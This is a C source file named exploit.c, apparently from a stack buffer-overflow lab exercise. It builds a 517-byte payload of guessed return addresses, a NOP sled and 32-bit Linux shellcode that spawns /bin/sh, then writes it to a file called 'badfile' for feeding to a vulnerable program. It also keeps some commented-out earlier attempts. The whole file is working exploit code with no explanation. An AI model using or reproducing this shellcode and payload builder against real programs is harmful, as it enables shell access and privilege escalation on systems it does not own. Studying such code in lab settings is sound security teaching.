/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
		"\x31\xc0"             /* xorl    %eax,%eax              */
		"\x50"                 /* pushl   %eax                   */
		"\x68""//sh"           /* pushl   $0x68732f2f            */
		"\x68""/bin"           /* pushl   $0x6e69622f            */
		"\x89\xe3"             /* movl    %esp,%ebx              */
		"\x50"                 /* pushl   %eax                   */
		"\x53"                 /* pushl   %ebx                   */
		"\x89\xe1"             /* movl    %esp,%ecx              */
		"\x99"                 /* cdql                           */
		"\xb0\x0b"             /* movb    $0x0b,%al              */
		"\xcd\x80"             /* int     $0x80                  */
		;

unsigned long get_sp(void) {
	__asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
	char buff[517];
	FILE *badfile;

	char *ptr;
	long *addr_ptr, addr;
	int bsize=517;
	int i;


	addr = get_sp() + 32;
	printf("Using address: 0x%x\n", addr);

	ptr = buff;
	addr_ptr = (long *) ptr;
	
	// changes everything to have return address
	for (i = 0; i < bsize; i+=4)
		*(addr_ptr++) = addr - 104 - 16;

	// starting at 32 fill with nops
	for (i = 32; i < bsize; i++)
		buff[i] = 0x90;
		
	for (i = 0; i < strlen(shellcode); i++)
		buff[i+128] = shellcode[i];
	
	//ptr = buff + 136 + (strlen(shellcode)/2);
	//for (i = 0; i < strlen(shellcode); i++)
	//	*(ptr++) = shellcode[i];
		
		//0xffffd048	

	buff[bsize - 1] = '\0';
	
	//buffer = *buff;

	/* Initialize buffer with 0x90 (NOP instruction) */
	//memset(&buffer, 0x90, 517);

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buff, 517, 1, badfile);
	fclose(badfile);
}

